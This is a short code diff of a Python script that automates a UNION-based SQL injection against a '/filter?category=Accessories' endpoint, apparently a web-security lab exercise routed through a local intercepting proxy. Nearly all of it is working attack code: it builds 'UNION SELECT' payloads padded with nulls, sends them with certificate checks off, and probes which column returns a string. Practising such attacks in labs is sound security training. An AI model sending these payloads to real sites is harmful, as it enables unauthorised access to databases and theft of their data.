@@ -24,21 +24,19 @@ def get_no_column(url):
         return 0
     
 def get_String_column(url, noOfColumn):
-   path = "/filter?category=Accessories"
-   string = "'dMTt7j'" 
+    path = "/filter?category=Accessories"
+    string = "'dMTt7j'" 
 
-   for i in range(1,noOfColumn+1):
+    for i in range(1,noOfColumn+1):
        payload_list = ['null'] * noOfColumn
        payload_list[i-1] =  string
-       sql_payload = "' UNION SELECT " + ','.join(payload_list) + "--"
+       sql_payload = "'+UNION+SELECT+" + ','.join(payload_list) + "--"
 
        res = requests.get(url+path+sql_payload, verify= False, proxies=proxies)
 
-       if(string.strip("'") in res.text):
+       if(res.status_code == 200):
         return i
-       
-       return False
-        
+    return False
 
 proxies = {
     'http' : 'http://127.0.0.1:8080',
